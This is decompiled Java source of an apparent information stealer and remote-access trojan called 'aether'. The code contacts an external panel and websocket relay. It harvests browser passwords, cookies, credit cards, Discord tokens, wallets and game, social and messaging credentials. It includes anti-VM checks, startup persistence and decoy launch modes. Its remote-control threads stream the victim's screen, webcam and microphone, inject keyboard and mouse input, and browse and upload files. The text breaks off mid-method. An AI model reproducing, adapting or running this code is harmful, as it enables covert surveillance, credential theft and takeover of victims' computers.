/*
 * Decompiled with CFR 0.152.
 */
package aether;

import aether.Config;
import com.github.sarxos.webcam.Webcam;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.RenderingHints;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.Security;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Comparator;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.MemoryCacheImageOutputStream;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.Line;
import javax.sound.sampled.TargetDataLine;
import javax.swing.JOptionPane;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;
import org.conscrypt.Conscrypt;
import x.a;
import x.aa;
import x.ab;
import x.ac;
import x.ad;
import x.ae;
import x.af;
import x.ag;
import x.ah;
import x.ai;
import x.aj;
import x.b;
import x.c;
import x.f;
import x.g;
import x.h;
import x.i;
import x.j;
import x.l;
import x.n;
import x.o;
import x.p;
import x.q;
import x.r;
import x.s;
import x.t;
import x.u;
import x.v;
import x.w;
import x.x;
import x.y;
import x.z;

public class Main {
    private static String a = "%%BUILD_ID%%";
    private static String b = "https://aether-panel.vercel.app";
    private static String c = null;
    private static boolean d = false;

    public static void main(String[] stringArray) {
        System.setProperty("jdk.tls.client.protocols", "TLSv1.2,TLSv1.3");
        System.setProperty("https.protocols", "TLSv1.2,TLSv1.3");
        try {
            Security.insertProviderAt(Conscrypt.newProvider(), 1);
        }
        catch (Throwable throwable) {}
        try {
            if (stringArray.length > 0 && !stringArray[0].isEmpty()) {
                a = stringArray[0];
            }
            if (stringArray.length >= 2 && !stringArray[1].isEmpty()) {
                b = stringArray[1];
            }
            String[] stringArray2 = stringArray;
            int n2 = stringArray.length;
            for (int i2 = 0; i2 < n2; ++i2) {
                String string = stringArray2[i2];
                if (!"--startup".equals(string)) continue;
                d = true;
            }
            if (stringArray.length >= 4 && !stringArray[3].isEmpty() && !stringArray[3].startsWith("--")) {
                c = stringArray[3];
            }
            Main.b();
            return;
        }
        catch (Throwable throwable) {
            System.exit(0);
            return;
        }
    }

    private static void b() throws Exception {
        boolean bl;
        Object object;
        Config config;
        Object object2;
        if (d) {
            for (int i2 = 0; i2 < 60; ++i2) {
                try {
                    InetAddress.getByName("8.8.8.8");
                    break;
                }
                catch (Exception exception) {
                    try {
                        Thread.sleep(5000L);
                        continue;
                    }
                    catch (InterruptedException interruptedException) {
                        break;
                    }
                }
            }
        }
        if ("TEST".equals(a)) {
            object2 = c != null && !c.isEmpty() ? c : a;
            config = new Config();
            new Config().buildId = object2;
            config.relayUrl = b + "/api/relay/" + (String)object2;
            config.features = new Config.Features();
            config.features.cookies = true;
            config.features.passwords = true;
            config.features.history = true;
            config.features.autofills = true;
            config.features.creditCards = true;
            config.features.bookmarks = true;
            config.features.discordTokens = true;
            config.features.screenshot = false;
            config.features.wallets = false;
            config.features.antiVM = false;
            config.features.steam = true;
            config.features.steamAccounts = true;
            config.features.roblox = true;
            config.features.minecraft = true;
            config.features.instagram = true;
            config.features.tiktok = true;
            config.features.spotify = true;
            config.features.reddit = true;
            config.features.telegram = true;
            config.features.whatsApp = true;
            config.features.fileZilla = true;
            config.features.clipboard = true;
            config.features.riot = true;
            config.features.growtopia = true;
            config.features.battleNet = true;
            config.features.ubisoft = true;
            config.features.ea = true;
            config.features.rockstar = true;
        } else {
            config = Config.load(b, a);
        }
        if (d) {
            config.relayUrl = config.relayUrl + "?startup=1";
        }
        if (config.features.antiVM) {
            object2 = j.a();
            if (((j)object2).o) {
                System.exit(0);
            }
        }
        if (config.features.startup && !d) {
            object2 = a;
            String string = b;
            new Thread(() -> Main.b((String)object2, string)).start();
        }
        object2 = new h.b();
        new h.b().a = System.getenv("COMPUTERNAME") != null ? System.getenv("COMPUTERNAME") : "unknown";
        ((h.b)object2).b = System.getenv("USERNAME") != null ? System.getenv("USERNAME") : "unknown";
        boolean bl2 = "game".equals(config.features.launchMode);
        Object object3 = bl2 ? (config.features.gameUrl != null ? config.features.gameUrl : "https://mineplay.io/eaglercraft/1.8.8-js/index.html") : (object = null);
        if ("error".equals(config.features.launchMode)) {
            new Thread(new Runnable(){

                @Override
                public final void run() {
                    Main.a();
                }
            }).start();
        }
        ExecutorService executorService = Executors.newFixedThreadPool(8);
        Object object4 = new ArrayList();
        Object object5 = new List[1];
        Object object62 = new CountDownLatch(1);
        object4.add(executorService.submit(() -> Main.r((h.b)object2)));
        if (config.features.screenshot) {
            object4.add(executorService.submit(() -> Main.q((h.b)object2)));
        }
        if (config.features.cookies || config.features.passwords || config.features.history || config.features.autofills) {
            object4.add(executorService.submit(() -> Main.a(config, (h.b)object2, (List[])object5, (CountDownLatch)object62)));
        } else {
            ((CountDownLatch)object62).countDown();
        }
        if (config.features.discordTokens) {
            object4.add(executorService.submit(() -> Main.p((h.b)object2)));
        }
        if (config.features.wallets) {
            object4.add(executorService.submit(() -> Main.o((h.b)object2)));
        }
        if (config.features.clipboard) {
            object4.add(executorService.submit(() -> Main.n((h.b)object2)));
        }
        if (config.features.growtopia) {
            object4.add(executorService.submit(() -> Main.m((h.b)object2)));
        }
        if (config.features.battleNet) {
            object4.add(executorService.submit(() -> Main.l((h.b)object2)));
        }
        if (config.features.fileZilla) {
            object4.add(executorService.submit(() -> Main.k((h.b)object2)));
        }
        if (config.features.telegram) {
            object4.add(executorService.submit(() -> Main.j((h.b)object2)));
        }
        if (config.features.whatsApp) {
            object4.add(executorService.submit(() -> Main.i((h.b)object2)));
        }
        if (config.features.ubisoft) {
            object4.add(executorService.submit(() -> Main.h((h.b)object2)));
        }
        if (config.features.ea) {
            object4.add(executorService.submit(() -> Main.g((h.b)object2)));
        }
        if (config.features.rockstar) {
            object4.add(executorService.submit(() -> Main.f((h.b)object2)));
        }
        if (config.features.epicGames) {
            object4.add(executorService.submit(() -> Main.e((h.b)object2)));
        }
        if (config.features.vpnData) {
            object4.add(executorService.submit(() -> Main.d((h.b)object2)));
        }
        if (config.features.stolenFiles) {
            object4.add(executorService.submit(() -> Main.c((h.b)object2)));
        }
        if (config.features.steam || config.features.steamAccounts) {
            object4.add(executorService.submit(() -> Main.b((h.b)object2)));
        }
        if (config.features.minecraft) {
            object4.add(executorService.submit(() -> Main.a((h.b)object2)));
        }
        executorService.shutdown();
        executorService.awaitTermination(90L, TimeUnit.SECONDS);
        boolean bl3 = config.features.roblox || config.features.tiktok || config.features.instagram || config.features.spotify || config.features.reddit || config.features.riot;
        if (bl3) {
            try {
                ((CountDownLatch)object62).await(5L, TimeUnit.SECONDS);
            }
            catch (Exception exception) {}
            ArrayList<l.c> arrayList = new ArrayList<l.c>();
            object4 = object2;
            synchronized (object4) {
                if (object5[0] != null) {
                    for (Object object62 : object5[0]) {
                        arrayList.addAll(((l.b)object62).c);
                    }
                }
            }
            object4 = Executors.newFixedThreadPool(6);
            object5 = new ArrayList();
            if (config.features.roblox) {
                object5.add(object4.submit(() -> Main.f(arrayList, (h.b)object2)));
            }
            if (config.features.tiktok) {
                object5.add(object4.submit(() -> Main.e(arrayList, (h.b)object2)));
            }
            if (config.features.instagram) {
                object5.add(object4.submit(() -> Main.d(arrayList, (h.b)object2)));
            }
            if (config.features.spotify) {
                object5.add(object4.submit(() -> Main.c(arrayList, (h.b)object2)));
            }
            if (config.features.reddit) {
                object5.add(object4.submit(() -> Main.b(arrayList, (h.b)object2)));
            }
            if (config.features.riot) {
                object5.add(object4.submit(() -> Main.a(arrayList, (h.b)object2)));
            }
            object4.shutdown();
            object4.awaitTermination(60L, TimeUnit.SECONDS);
        }
        if (object != null) {
            new Thread(new Runnable((String)object){
                private /* synthetic */ String a;
                {
                    this.a = string;
                }

                @Override
                public final void run() {
                    Main.a(this.a);
                    try {
                        Thread.sleep(2500L);
                    }
                    catch (InterruptedException interruptedException) {}
                    try {
                        Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
                        Robot robot = new Robot();
                        robot.mouseMove(dimension.width / 2, dimension.height / 2);
                        robot.mousePress(1024);
                        robot.mouseRelease(1024);
                        return;
                    }
                    catch (Exception exception) {
                        return;
                    }
                }
            }).start();
        }
        if (config.features.remoteControl) {
            String string = config.streamRelayUrl;
            object4 = string;
            object = config.buildId;
            object4 = object4 != null && !((String)object4).isEmpty() ? object4 : "wss://screen-relay.abelbiffle.workers.dev";
            object = new Thread(new Runnable(){
                private /* synthetic */ String a;
                private /* synthetic */ String b;
                {
                    this.a = string;
                    this.b = string2;
                }

                public final void run() {
                    String string = this.b;
                    String string2 = this.a;
                    while (true) {
                        block15: {
                            try {
                                Robot robot;
                                Object object = string;
                                Object object2 = string2;
                                object2 = (String)object + $S.d(236) + (String)object2 + $S.d(855);
                                object = new AtomicBoolean(false);
                                AtomicBoolean atomicBoolean = new AtomicBoolean(false);
                                CountDownLatch countDownLatch = new CountDownLatch(1);
                                AtomicReference<Object> atomicReference = new AtomicReference<Object>(null);
                                try {
                                    robot = new Robot();
                                }
                                catch (Exception exception) {
                                    break block15;
                                }
                                Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
                                int n2 = dimension.width;
                                int n3 = dimension.height;
                                OkHttpClient okHttpClient = new OkHttpClient.Builder().pingInterval(20L, TimeUnit.SECONDS).build();
                                object2 = new Request.Builder().url((String)object2).build();
                                okHttpClient.newWebSocket((Request)object2, new WebSocketListener(atomicReference, (AtomicBoolean)object, robot, n2, n3, atomicBoolean, countDownLatch){
                                    private /* synthetic */ AtomicReference a;
                                    private /* synthetic */ AtomicBoolean b;
                                    private /* synthetic */ Robot c;
                                    private /* synthetic */ int d;
                                    private /* synthetic */ int e;
                                    private /* synthetic */ AtomicBoolean f;
                                    private /* synthetic */ CountDownLatch g;
                                    {
                                        this.a = atomicReference;
                                        this.b = atomicBoolean;
                                        this.c = robot;
                                        this.d = n2;
                                        this.e = n3;
                                        this.f = atomicBoolean2;
                                        this.g = countDownLatch;
                                    }

                                    public final void onOpen(WebSocket webSocket, Response response) {
                                        this.a.set(webSocket);
                                    }

                                    /*
                                     * Enabled force condition propagation
                                     * Lifted jumps to return sites
                                     */
                                    public final void onMessage(WebSocket object, String object2) {
                                        if (((String)object2).contains($S.d(853))) {
                                            this.b.set(true);
                                            return;
                                        }
                                        if (((String)object2).contains($S.d(854))) {
                                            this.b.set(false);
                                            return;
                                        }
                                        Object object3 = object2;
                                        int n2 = this.e;
                                        int n3 = this.d;
                                        object2 = this.c;
                                        object = object3;
                                        object = object3;
                                        try {
                                            int n4;
                                            String string = f.a((String)object, $S.d(3));
                                            if (string == null) {
                                                return;
                                            }
                                            if ($S.d(857).equals(string) || $S.d(858).equals(string) || $S.d(859).equals(string) || $S.d(860).equals(string)) {
                                                double d2 = f.b((String)object, "x");
                                                double d3 = f.b((String)object, "y");
                                                n3 = (int)(d2 * (double)n3);
                                                n2 = (int)(d3 * (double)n2);
                                                ((Robot)object2).mouseMove(n3, n2);
                                                if ($S.d(858).equals(string)) {
                                                    object = f.a((String)object, $S.d(861));
                                                    int n5 = $S.d(862).equals(object) ? 4096 : 1024;
                                                    ((Robot)object2).mousePress(n5);
                                                    return;
                                                }
                                                if ($S.d(859).equals(string)) {
                                                    object = f.a((String)object, $S.d(861));
                                                    int n6 = $S.d(862).equals(object) ? 4096 : 1024;
                                                    ((Robot)object2).mouseRelease(n6);
                                                    return;
                                                }
                                                if (!$S.d(860).equals(string)) return;
                                                object = f.a((String)object, $S.d(861));
                                                int n7 = $S.d(862).equals(object) ? 4096 : 1024;
                                                ((Robot)object2).mousePress(n7);
                                                ((Robot)object2).mouseRelease(n7);
                                                return;
                                            }
                                            if ($S.d(863).equals(string)) {
                                                int n8 = f.a(f.a((String)object, $S.d(864)));
                                                if (n8 == 0) return;
                                                ((Robot)object2).keyPress(n8);
                                                return;
                                            }
                                            if ($S.d(865).equals(string)) {
                                                int n9 = f.a(f.a((String)object, $S.d(864)));
                                                if (n9 == 0) return;
                                                ((Robot)object2).keyRelease(n9);
                                                return;
                                            }
                                            if (!$S.d(866).equals(string) || (n4 = (int)f.b((String)object, "dy")) == 0) return;
                                            ((Robot)object2).mouseWheel(n4);
                                            return;
                                        }
                                        catch (Exception exception) {}
                                    }

                                    public final void onMessage(WebSocket webSocket, ByteString byteString) {
                                    }

                                    public final void onClosing(WebSocket webSocket, int n2, String string) {
                                        webSocket.close(1000, null);
                                    }

                                    public final void onClosed(WebSocket webSocket, int n2, String string) {
                                        this.f.set(true);
                                        this.g.countDown();
                                    }

                                    public final void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                                        this.f.set(true);
                                        this.g.countDown();
                                    }
                                });
                                while (!atomicBoolean.get()) {
                                    WebSocket webSocket = atomicReference.get();
                                    if (webSocket != null && ((AtomicBoolean)object).get()) {
                                        try {
                                            int n4 = n3;
                                            int n5 = n2;
                                            Object object3 = robot;
                                            object3 = ((Robot)object3).createScreenCapture(new Rectangle(n5, n4));
                                            int n6 = 1280;
                                            int n7 = 720;
                                            if (n5 > 0 && n4 > 0) {
                                                double d2 = Math.min(1280.0 / (double)n5, 720.0 / (double)n4);
                                                n6 = (int)((double)n5 * d2);
                                                n7 = (int)((double)n4 * d2);
                                            }
                                            BufferedImage bufferedImage = new BufferedImage(n6, n7, 1);
                                            Graphics2D graphics2D = bufferedImage.createGraphics();
                                            graphics2D.drawImage((Image)object3, 0, 0, n6, n7, null);
                                            graphics2D.dispose();
                                            object3 = new ByteArrayOutputStream();
                                            ImageIO.write((RenderedImage)bufferedImage, $S.d(856), (OutputStream)object3);
                                            object3 = ((ByteArrayOutputStream)object3).toByteArray();
                                            boolean bl = webSocket.send(ByteString.of((byte[])object3));
                                            if (!bl) {
                                            }
                                        }
                                        catch (Exception exception) {}
                                        break;
                                    }
                                    try {
                                        Thread.sleep(100L);
                                        continue;
                                    }
                                    catch (InterruptedException interruptedException) {}
                                    break;
                                }
                                countDownLatch.await(10L, TimeUnit.SECONDS);
                                okHttpClient.dispatcher().executorService().shutdown();
                            }
                            catch (Exception exception) {}
                        }
                        try {
                            Thread.sleep(3000L);
                        }
                        catch (InterruptedException interruptedException) {
                            return;
                        }
                    }
                }
            }, "remote-control");
            ((Thread)object).setDaemon(true);
            ((Thread)object).start();
            object4 = string;
            object = config.buildId;
            object4 = object4 != null && !((String)object4).isEmpty() ? object4 : "wss://screen-relay.abelbiffle.workers.dev";
            object = new Thread(new Runnable(){
                private /* synthetic */ String a;
                private /* synthetic */ String b;
                {
                    this.a = string;
                    this.b = string2;
                }

                public final void run() {
                    String string = this.b;
                    String string2 = this.a;
                    while (true) {
                        try {
                            Object object = string;
                            Object object2 = string2;
                            object2 = (String)object + $S.d(236) + (String)object2 + $S.d(1054);
                            object = new AtomicBoolean(false);
                            AtomicBoolean atomicBoolean = new AtomicBoolean(false);
                            CountDownLatch countDownLatch = new CountDownLatch(1);
                            AtomicReference<Object> atomicReference = new AtomicReference<Object>(null);
                            AtomicReference<Object> atomicReference2 = new AtomicReference<Object>(null);
                            OkHttpClient okHttpClient = new OkHttpClient.Builder().pingInterval(20L, TimeUnit.SECONDS).build();
                            object2 = new Request.Builder().url((String)object2).build();
                            okHttpClient.newWebSocket((Request)object2, new WebSocketListener(atomicReference, (AtomicBoolean)object, atomicReference2, atomicBoolean, countDownLatch){
                                private /* synthetic */ AtomicReference a;
                                private /* synthetic */ AtomicBoolean b;
                                private /* synthetic */ AtomicReference c;
                                private /* synthetic */ AtomicBoolean d;
                                private /* synthetic */ CountDownLatch e;
                                {
                                    this.a = atomicReference;
                                    this.b = atomicBoolean;
                                    this.c = atomicReference2;
                                    this.d = atomicBoolean2;
                                    this.e = countDownLatch;
                                }

                                public final void onOpen(WebSocket webSocket, Response response) {
                                    this.a.set(webSocket);
                                }

                                public final void onMessage(WebSocket object, String string) {
                                    if (string.contains($S.d(853))) {
                                        this.b.set(true);
                                        try {
                                            object = Webcam.getDefault();
                                            if (object != null) {
                                                if (!((Webcam)object).isOpen()) {
                                                    ((Webcam)object).open();
                                                }
                                                this.c.set(object);
                                            }
                                            return;
                                        }
                                        catch (Exception exception) {
                                            return;
                                        }
                                    }
                                    if (string.contains($S.d(854))) {
                                        this.b.set(false);
                                        object = this.c.getAndSet(null);
                                        if (object != null) {
                                            try {
                                                if (((Webcam)object).isOpen()) {
                                                    ((Webcam)object).close();
                                                }
                                                return;
                                            }
                                            catch (Exception exception) {}
                                        }
                                    }
                                }

                                public final void onMessage(WebSocket webSocket, ByteString byteString) {
                                }

                                public final void onClosing(WebSocket webSocket, int n2, String string) {
                                    webSocket.close(1000, null);
                                }

                                public final void onClosed(WebSocket webSocket, int n2, String string) {
                                    this.d.set(true);
                                    this.e.countDown();
                                }

                                public final void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                                    this.d.set(true);
                                    this.e.countDown();
                                }
                            });
                            while (!atomicBoolean.get()) {
                                WebSocket webSocket = atomicReference.get();
                                Object object3 = atomicReference2.get();
                                if (webSocket != null && ((AtomicBoolean)object).get() && object3 != null && ((Webcam)object3).isOpen()) {
                                    try {
                                        boolean bl;
                                        Object object4;
                                        object3 = ((Webcam)object3).getImage();
                                        if (object3 == null) {
                                            object4 = null;
                                        } else {
                                            BufferedImage bufferedImage = new BufferedImage(320, 240, 1);
                                            Object object5 = bufferedImage.createGraphics();
                                            ((Graphics2D)object5).setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
                                            ((Graphics)object5).drawImage((Image)object3, 0, 0, 320, 240, null);
                                            ((Graphics)object5).dispose();
                                            object3 = ImageIO.getImageWritersByFormatName($S.d(856));
                                            if (!object3.hasNext()) {
                                                object3 = new ByteArrayOutputStream();
                                                ImageIO.write((RenderedImage)bufferedImage, $S.d(856), (OutputStream)object3);
                                                object4 = ((ByteArrayOutputStream)object3).toByteArray();
                                            } else {
                                                object3 = object3.next();
                                                object5 = ((ImageWriter)object3).getDefaultWriteParam();
                                                ((ImageWriteParam)object5).setCompressionMode(2);
                                                ((ImageWriteParam)object5).setCompressionQuality(0.5f);
                                                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(16384);
                                                ((ImageWriter)object3).setOutput(new MemoryCacheImageOutputStream(byteArrayOutputStream));
                                                ((ImageWriter)object3).write(null, new IIOImage(bufferedImage, null, null), (ImageWriteParam)object5);
                                                ((ImageWriter)object3).dispose();
                                                object3 = byteArrayOutputStream.toByteArray();
                                                object4 = object3;
                                            }
                                        }
                                        if (object4 != null && !(bl = webSocket.send(ByteString.of((byte[])object3)))) {
                                        }
                                    }
                                    catch (Exception exception) {}
                                    break;
                                }
                                try {
                                    Thread.sleep(100L);
                                    continue;
                                }
                                catch (InterruptedException interruptedException) {}
                                break;
                            }
                            if ((object2 = (Webcam)atomicReference2.getAndSet(null)) != null) {
                                try {
                                    if (((Webcam)object2).isOpen()) {
                                        ((Webcam)object2).close();
                                    }
                                }
                                catch (Exception exception) {}
                            }
                            countDownLatch.await(10L, TimeUnit.SECONDS);
                            okHttpClient.dispatcher().executorService().shutdown();
                        }
                        catch (Exception exception) {}
                        try {
                            Thread.sleep(3000L);
                        }
                        catch (InterruptedException interruptedException) {
                            return;
                        }
                    }
                }
            }, "webcam-rc");
            ((Thread)object).setDaemon(true);
            ((Thread)object).start();
            object4 = string;
            object = config.buildId;
            object4 = object4 != null && !((String)object4).isEmpty() ? object4 : "wss://screen-relay.abelbiffle.workers.dev";
            object = new Thread(new Runnable(){
                private /* synthetic */ String a;
                private /* synthetic */ String b;
                {
                    this.a = string;
                    this.b = string2;
                }

                public final void run() {
                    String string = this.b;
                    String string2 = this.a;
                    while (true) {
                        block12: {
                            try {
                                Object object = string;
                                Object object2 = string2;
                                object2 = (String)object + $S.d(236) + (String)object2 + $S.d(852);
                                object = new AtomicBoolean(false);
                                AtomicBoolean atomicBoolean = new AtomicBoolean(false);
                                CountDownLatch countDownLatch = new CountDownLatch(1);
                                AtomicReference<Object> atomicReference = new AtomicReference<Object>(null);
                                OkHttpClient okHttpClient = new OkHttpClient.Builder().pingInterval(20L, TimeUnit.SECONDS).build();
                                object2 = new Request.Builder().url((String)object2).build();
                                okHttpClient.newWebSocket((Request)object2, new WebSocketListener(atomicReference, (AtomicBoolean)object, atomicBoolean, countDownLatch){
                                    private /* synthetic */ AtomicReference a;
                                    private /* synthetic */ AtomicBoolean b;
                                    private /* synthetic */ AtomicBoolean c;
                                    private /* synthetic */ CountDownLatch d;
                                    {
                                        this.a = atomicReference;
                                        this.b = atomicBoolean;
                                        this.c = atomicBoolean2;
                                        this.d = countDownLatch;
                                    }

                                    public final void onOpen(WebSocket webSocket, Response response) {
                                        this.a.set(webSocket);
                                    }

                                    public final void onMessage(WebSocket webSocket, String string) {
                                        if (string.contains($S.d(853))) {
                                            this.b.set(true);
                                            return;
                                        }
                                        if (string.contains($S.d(854))) {
                                            this.b.set(false);
                                        }
                                    }

                                    public final void onMessage(WebSocket webSocket, ByteString byteString) {
                                    }

                                    public final void onClosing(WebSocket webSocket, int n2, String string) {
                                        webSocket.close(1000, null);
                                    }

                                    public final void onClosed(WebSocket webSocket, int n2, String string) {
                                        this.c.set(true);
                                        this.d.countDown();
                                    }

                                    public final void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                                        this.c.set(true);
                                        this.d.countDown();
                                    }
                                });
                                object2 = new AudioFormat(16000.0f, 16, 1, true, false);
                                Object object3 = new DataLine.Info(TargetDataLine.class, (AudioFormat)object2);
                                if (!AudioSystem.isLineSupported((Line.Info)object3)) {
                                    countDownLatch.await(10L, TimeUnit.SECONDS);
                                    okHttpClient.dispatcher().executorService().shutdown();
                                    break block12;
                                }
                                try {
                                    object3 = (TargetDataLine)AudioSystem.getLine((Line.Info)object3);
                                    object3.open((AudioFormat)object2);
                                    object3.start();
                                }
                                catch (Exception exception) {
                                    countDownLatch.await(10L, TimeUnit.SECONDS);
                                    okHttpClient.dispatcher().executorService().shutdown();
                                    break block12;
                                }
                                object2 = new byte[6400];
                                while (!atomicBoolean.get()) {
                                    if (object3.available() >= 6400) {
                                        WebSocket webSocket;
                                        int n2 = object3.read((byte[])object2, 0, 6400);
                                        if (n2 <= 0 || (webSocket = (WebSocket)atomicReference.get()) == null || !((AtomicBoolean)object).get()) continue;
                                        byte[] byArray = new byte[n2];
                                        System.arraycopy(object2, 0, byArray, 0, n2);
                                        webSocket.send(ByteString.of(byArray));
                                        continue;
                                    }
                                    try {
                                        Thread.sleep(20L);
                                        continue;
                                    }
                                    catch (InterruptedException interruptedException) {}
                                    break;
                                }
                                object3.stop();
                                object3.close();
                                countDownLatch.await(10L, TimeUnit.SECONDS);
                                okHttpClient.dispatcher().executorService().shutdown();
                            }
                            catch (Exception exception) {}
                        }
                        try {
                            Thread.sleep(3000L);
                        }
                        catch (InterruptedException interruptedException) {
                            return;
                        }
                    }
                }
            }, "mic-rc");
            ((Thread)object).setDaemon(true);
            ((Thread)object).start();
            x.a.a(config.buildId, string);
            object4 = string;
            object = config.buildId;
            object4 = object4 != null && !((String)object4).isEmpty() ? object4 : "wss://screen-relay.abelbiffle.workers.dev";
            object = new Thread(new Runnable(){
                private /* synthetic */ String a;
                private /* synthetic */ String b;
                {
                    this.a = string;
                    this.b = string2;
                }

                @Override
                public final void run() {
                    String string = this.b;
                    String string2 = this.a;
                    while (true) {
                        try {
                            Object object = string;
                            Object object2 = string2;
                            object2 = (String)object + $S.d(236) + (String)object2 + $S.d(379);
                            object = new AtomicBoolean(false);
                            CountDownLatch countDownLatch = new CountDownLatch(1);
                            ExecutorService executorService = Executors.newSingleThreadExecutor();
                            OkHttpClient okHttpClient = new OkHttpClient.Builder().pingInterval(20L, TimeUnit.SECONDS).build();
                            object2 = new Request.Builder().url((String)object2).build();
                            okHttpClient.newWebSocket((Request)object2, new WebSocketListener(executorService, (AtomicBoolean)object, countDownLatch){
                                private /* synthetic */ ExecutorService a;
                                private /* synthetic */ AtomicBoolean b;
                                private /* synthetic */ CountDownLatch c;
                                {
                                    this.a = executorService;
                                    this.b = atomicBoolean;
                                    this.c = countDownLatch;
                                }

                                @Override
                                public final void onOpen(WebSocket webSocket, Response response) {
                                }

                                @Override
                                public final void onMessage(WebSocket webSocket, String string) {
                                    this.a.submit(new Runnable(){
                                        private /* synthetic */ WebSocket a;
                                        private /* synthetic */ String b;
                                        private /* synthetic */ c.2 c;
                                        {
                                            this.c = var1_1;
                                            this.a = webSocket;
                                            this.b = string;
                                        }

                                        @Override
                                        public final void run() {
                                            block25: {
                                                CharSequence charSequence = this.b;
                                                WebSocket webSocket = this.a;
                                                CharSequence charSequence2 = x.c.a(charSequence, "t");
                                                if ("ls".equals(charSequence2)) {
                                                    block24: {
                                                        charSequence2 = x.c.a(charSequence, "p");
                                                        charSequence = charSequence2 != null ? charSequence2 : "";
                                                        charSequence2 = new StringBuilder();
                                                        ((StringBuilder)charSequence2).append($S.d(380)).append(x.c.a(charSequence)).append($S.d(381));
                                                        try {
                                                            if (charSequence.isEmpty()) {
                                                                File[] fileArray = File.listRoots();
                                                                if (fileArray != null) {
                                                                    for (int i2 = 0; i2 < fileArray.length; ++i2) {
                                                                        String string = fileArray[i2].getAbsolutePath().replace("\\", "/");
                                                                        long l2 = fileArray[i2].getFreeSpace();
                                                                        long l3 = fileArray[i2].getTotalSpace();
                                                                        if (i2 > 0) {
                                                                            ((StringBuilder)charSequence2).append(",");
                                                                        }
                                                                        ((StringBuilder)charSequence2).append($S.d(382)).append(x.c.a(string)).append($S.d(383)).append($S.d(384)).append(l2).append($S.d(385)).append(l3).append("}");
                                                                    }
                                                                }
                                                                break block24;
                                                            }
                                                            File file = new File((String)charSequence);
                                                            File[] fileArray = file.listFiles();
                                                            if (fileArray == null) break block24;
                                                            Arrays.sort(fileArray, new Comparator<File>(){

                                                                @Override
                                                                public final /* synthetic */ int compare(Object object, Object object2) {
                                                                    object2 = (File)object2;
                                                                    if (((File)(object = (File)object)).isDirectory() && !((File)object2).isDirectory()) {
                                                                        return -1;
                                                                    }
                                                                    if (!((File)object).isDirectory() && ((File)object2).isDirectory()) {
                                                                        return 1;
                                                                    }
                                                                    return ((File)object).getName().compareToIgnoreCase(((File)object2).getName());
                                                                }
                                                            });
                                                            boolean bl = true;
                                                            File[] fileArray2 = fileArray;
                                                            int n2 = fileArray.length;
                                                            for (int i3 = 0; i3 < n2; ++i3) {
                                                                File file2 = fileArray2[i3];
                                                                if (file2.isHidden()) continue;
                                                                if (!bl) {
                                                                    ((StringBuilder)charSequence2).append(",");
                                                                }
                                                                bl = false;
                                                                ((StringBuilder)charSequence2).append($S.d(382)).append(x.c.a(file2.getName())).append($S.d(386)).append(file2.isDirectory());
                                                                if (!file2.isDirectory()) {
                                                                    ((StringBuilder)charSequence2).append($S.d(387)).append(file2.length());
                                                                }
                                                                ((StringBuilder)charSequence2).append("}");
                                                            }
                                                        }
                                                        catch (Exception exception) {
                                                            webSocket.send($S.d(388) + x.c.a(charSequence) + $S.d(269) + x.c.a(exception.getMessage() != null ? exception.getMessage() : $S.d(264)) + "\"}");
                                                            break block25;
                                                        }
                                                    }
                                                    ((StringBuilder)charSequence2).append("]}");
                                                    webSocket.send(((StringBuilder)charSequence2).toString());
                                                    return;
                                                }
                                                if ($S.d(389).equals(charSequence2)) {
                                                    charSequence2 = x.c.a(charSequence, "p");
                                                    charSequence = x.c.a(charSequence, "id");
                                                    int n3 = 0;
                                                    try {
                                                        n3 = Integer.parseInt(charSequence != null ? charSequence : "0");
                                                    }
                                                    catch (Exception exception) {}
                                                    if (charSequence2 != null) {
                                                        int n4 = n3;
                                                        charSequence = charSequence2;
                                                        Object object = new File((String)charSequence);
                                                        if (!((File)object).exists() || !((File)object).isFile()) {
                                                            webSocket.send($S.d(390) + n4 + $S.d(391));
                                                            return;
                                                        }
                                                        long l4 = ((File)object).length();
                                                        int n5 = (int)Math.max(1.0, Math.ceil((double)l4 / 262144.0));
                                                        webSocket.send($S.d(392) + n4 + $S.d(393) + x.c.a(((File)object).getName()) + $S.d(394) + l4 + $S.d(395) + n5 + "}");
                                                        try (FileInputStream fileInputStream = new FileInputStream((File)object);){
                                                            int n6;
                                                            byte[] byArray = new byte[262144];
                                                            int n7 = 0;
                                                            while ((n6 = fileInputStream.read(byArray)) > 0) {
                                                                byte[] byArray2 = new byte[n6 + 12];
                                                                object = byArray2;
                                                                x.c.a(byArray2, 0, n4);
                                                                x.c.a((byte[])object, 4, n7);
                                                                x.c.a((byte[])object, 8, n5);
                                                                System.arraycopy(byArray, 0, object, 12, n6);
                                                                boolean bl = webSocket.send(ByteString.of((byte[])object));
                                                                n6 = bl ? 1 : 0;
                                                                if (bl) {
                                                                    ++n7;
                                                                    try {
                                                                        Thread.sleep(5L);
                                                                        continue;
                                                                    }
                                                                    catch (InterruptedException interruptedException) {}
                                                                }
                                                                break;
                                                            }
                                                        }
                                                        catch (Exception exception) {
